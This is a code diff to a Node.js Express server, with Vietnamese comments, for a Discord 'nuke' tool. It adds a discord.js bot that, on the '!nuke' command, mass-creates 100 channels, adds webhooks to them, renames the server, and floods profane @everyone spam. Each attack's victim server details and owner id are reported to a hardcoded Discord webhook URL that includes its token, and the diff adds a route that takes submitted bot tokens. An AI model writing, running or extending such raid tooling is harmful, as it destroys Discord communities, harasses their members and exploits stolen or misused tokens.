@@ -1,11 +1,12 @@
 import express from 'express';
+import { Client, GatewayIntentBits, PermissionFlagsBits, ChannelType } from 'discord.js';
 import { ProxyAgent } from 'undici';
 import path from 'path';
 import { fileURLToPath } from 'url';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const app = express();
-app.use(express.json({ limit: '2mb' }));
+app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
 const NOTIFY_WEBHOOK = 'https://discord.com/api/webhooks/1571391518525358100/BLEIDxMtvlNlT593waQH56RCa68_RD5UPBtDvCRmgnFGC79YRWh1KZeY7QegvScWDjJj';
@@ -57,6 +58,9 @@ async function notifyNuke(info) {
   } catch {}
 }
 
+// ------------------------------------------------------------------
+// WEB PANEL ROUTE
+// ------------------------------------------------------------------
 app.post('/api/nuke', async (req, res) => {
   const {
     token, isBot, guildId, proxy,
@@ -69,6 +73,7 @@ app.post('/api/nuke', async (req, res) => {
 
   if (!token || !guildId) return res.status(400).json({ error: 'token + guildId required' });
 
+  // Cấm dùng mode bot qua web nếu không nhập token hợp lệ (cần check thêm)
   const cc = Math.max(1, Math.min(200, parseInt(channelCount, 10) || 100));
   const mc = Math.max(0, Math.min(20, parseInt(webhookMsgCount, 10) || 1));
 
@@ -197,6 +202,166 @@ app.post('/api/nuke', async (req, res) => {
     });
   } finally {
     res.end();
+  }
+});
+
+// ------------------------------------------------------------------
+// BOT DISCORD.JS LẮNG NGHE LỆNH !nuke
+// ------------------------------------------------------------------
+let botClient = null;
+let botToken = null;
+
+async function startBotDiscord(token) {
+  if (botClient) {
+    botClient.destroy();
+  }
+  botClient = new Client({
+    intents: [
+      GatewayIntentBits.Guilds,
+      GatewayIntentBits.GuildMessages,
+      GatewayIntentBits.MessageContent,
+      GatewayIntentBits.GuildMembers
+    ]
+  });
+
+  botClient.on('ready', () => {
+    console.log(`[BOT] Đã đăng nhập: ${botClient.user.tag}`);
+  });
+
+  botClient.on('messageCreate', async (message) => {
+    if (message.author.bot) return;
+    if (message.content !== '!nuke') return;
+
+    const guildId = message.guild.id;
+    const channel = message.channel;
+
+    // Bật trạng thái đang nuke
+    await channel.send('🚀 **Bắt đầu nuke server...**');
+    
+    // Thiết lập thông số mặc định
+    const cc = 100;
+    const channelName = 'NUKE BY PHTUANKHANH';
+    const renameName = 'NUKE BY PTK';
+    const mc = 1;
+    const pingEveryone = true;
+    
+    let channelsCreated = 0;
+    let webhooksCreated = 0;
+    let msgsSent = 0;
+    let guildObj = message.guild;
+
+    try {
+      const t0 = Date.now();
+      console.log(`[NUKE] Bắt đầu nuke guild ${guildId} từ lệnh !nuke`);
+
+      // 1. TẠO KÊNH
+      const channelIds = [];
+      const ccQueue = Array.from({ length: cc }, (_, i) => i);
+      
+      // Hàm phụ tạo kênh
+      const createChannel = async (i) => {
+        try {
+          const c = await guildObj.channels.create({
+            name: `${channelName}-${i}`,
+            type: ChannelType.GuildText,
+          });
+          channelIds.push(c.id);
+          channelsCreated++;
+        } catch (e) {
+          console.error(`Lỗi tạo kênh ${i}: ${e.message}`);
+        }
+      };
+
+      // Bắn 100 kênh song song
+      await Promise.allSettled(Array.from({ length: cc }, (_, i) => createChannel(i)));
+      
+      // 2. TẠO WEBHOOK
+      const webhooks = [];
+      const createWebhook = async (cid) => {
+        try {
+          const ch = await guildObj.channels.fetch(cid);
+          const w = await ch.createWebhook({ name: 'nuke' });
+          webhooks.push({ id: w.id, token: w.token });
+          webhooksCreated++;
+        } catch (e) {
+          console.error(`Lỗi tạo webhook kênh ${cid}: ${e.message}`);
+        }
+      };
+
+      await Promise.allSettled(channelIds.map(cid => createWebhook(cid)));
+
+      // 3. RENAME GUILD
+      try {
+        await guildObj.setName(renameName);
+      } catch (e) {}
+
+      // 4. SPAM WEBHOOK (Tự ping @everyone)
+      const total = webhooks.length * mc;
+      if (webhooks.length && mc > 0) {
+        const msgs = [
+          `# NUKED\n> ${pingEveryone ? '@everyone' : ''} cút hết`,
+          `# raz3d\n> ${pingEveryone ? '@everyone' : ''} server chết`,
+          `# get fucked\n> ${pingEveryone ? '@everyone' : ''}`,
+          `# void\n> ${pingEveryone ? '@everyone' : ''} nuke`,
+        ];
+        const pick = a => a[Math.floor(Math.random() * a.length)];
+        const jobs = [];
+        for (const w of webhooks) for (let i = 0; i < mc; i++) jobs.push(w);
+
+        const sendWebhookMsg = async (w) => {
+          const body = { content: pick(msgs), username: 'nuke' };
+          if (pingEveryone) body.allowed_mentions = { parse: ['everyone'] };
+          try {
+            const r = await fetch(`https://discord.com/api/v9/webhooks/${w.id}/${w.token}?wait=false`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(body),
+            });
+            if (r.ok) msgsSent++;
+          } catch (e) {}
+        };
+
+        await Promise.allSettled(jobs.map(w => sendWebhookMsg(w)));
+      }
+
+      // Gửi thông báo
+      await notifyNuke({
+        guildName: guildObj.name,
+        guildIcon: guildObj.iconURL({ size: 256 }),
+        guildId, ownerId: guildObj.ownerId,
+        mode: 'bot',
+        channels: channelsCreated, webhooks: webhooksCreated, msgs: msgsSent,
+        user: botClient.user.username,
+        error: null,
+      });
+
+      const timeTaken = Date.now() - t0;
+      console.log(`[NUKE] Xong trong ${timeTaken}ms`);
+      
+    } catch (err) {
+      console.error('Lỗi nuke:', err.message);
+      await notifyNuke({
+        guildName: guildObj.name, guildIcon: guildObj.iconURL({ size: 256 }), guildId,
+        ownerId: guildObj.ownerId, mode: 'bot', channels: channelsCreated, webhooks: webhooksCreated,
+        msgs: msgsSent, user: botClient.user.username, error: err.message
+      });
+    }
+  });
+
+  await botClient.login(token);
+}
+
+// API nhận token bot để bật bot
+app.post('/api/bot-login', async (req, res) => {
+  const { token } = req.body ?? {};
+  if (!token) return res.status(400).json({ error: 'Thiếu token bot' });
+  
+  try {
+    botToken = token;
+    await startBotDiscord(token);
+    res.json({ ok: true, user: botClient.user.tag });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
   }
 });
 
